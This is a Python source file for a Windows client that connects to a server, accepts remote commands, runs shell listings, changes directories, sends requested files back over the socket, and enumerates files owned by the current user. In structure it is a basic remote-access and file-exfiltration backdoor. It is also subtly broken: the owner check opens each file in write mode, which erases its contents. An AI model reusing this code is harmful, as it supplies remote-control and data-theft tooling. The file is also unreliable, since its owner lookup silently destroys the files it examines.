from socket import *
import subprocess
import os
import getpass
import win32api
import win32con
import win32security


def sendDirNTreeOutput(clientSocket, cmd):
    out = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
    outputSize = str(out.__sizeof__())
    clientSocket.send(outputSize.encode())
    clientSocket.send(out.encode())


def exitNClose(clientSocket):
    out = "Ok"
    clientSocket.send(out.encode())
    return True


def changeDirectory(clientSocket, cmd):
    if cmd != "cd":
        cmd = cmd.replace("cd ", "")
        os.chdir(cmd)
    os.system("dir")
    out = os.getcwd()
    clientSocket.send(out.encode())


def getFile(clientSocket, fileName, fileSize):
    file = open(fileName, 'rb')
    while fileSize > 0:
        if fileSize < 1024:
            print("in")
            l = file.read(fileSize)
        else:
            l = file.read(1024)
        fileSize = fileSize - 1024
        clientSocket.send(l)
        print("Caricamento...")
    print("Inviato")
    file.close()


def getOwner(FILENAME):
    domain = ""
    name = ""
    try:
        open(FILENAME, "w").close()
        sd = win32security.GetFileSecurity(FILENAME, win32security.OWNER_SECURITY_INFORMATION)
        owner_sid = sd.GetSecurityDescriptorOwner()
        name, domain, type = win32security.LookupAccountSid(None, owner_sid)
    except:
        print("Warning")

    return domain + "\\" + name


def isOwner(user, fileName):
    return getOwner(fileName) == user


def main():
    serverName = 'localhost'
    serverPort = 12000
    clientSocket = socket(AF_INET, SOCK_STREAM)
    clientSocket.connect((serverName, serverPort))
    esc = False

    while not esc:
        cmd = clientSocket.recv(1024).decode()
        if len(cmd) == 0:
            break

        elif cmd == "dir" or cmd == "tree":
            sendDirNTreeOutput(clientSocket, cmd)

        elif "cd" in cmd:
            changeDirectory(clientSocket, cmd)

        elif cmd == "esc":
            esc = exitNClose(clientSocket)

        elif "get" in cmd:
            fileName = cmd.replace("get ", "")
            fileSize = os.path.getsize(fileName)
            print(str(fileSize))
            fileSize = str(fileSize)
            clientSocket.send(fileSize.encode())
            fileSize = int(fileSize)
            getFile(clientSocket, fileName, fileSize)

        elif "owner" in cmd:
            FILENAME = cmd.replace("owner ", "")
            getOwner(FILENAME)
            # manca feedback

        elif "scrape" in cmd:
            user = win32api.GetUserNameEx(win32con.NameSamCompatible)
            path = ""
            for dirname, dirnames, filenames in os.walk('.'):
                path = path + dirname + "\\"
                for filename in filenames:
                    path = path + filename + "\n"
                    if isOwner(user, path):
                        print(filename)
                    path = path.replace(filename + "\n", "")
                path = ""

    clientSocket.close()


if __name__ == "__main__":
    main()
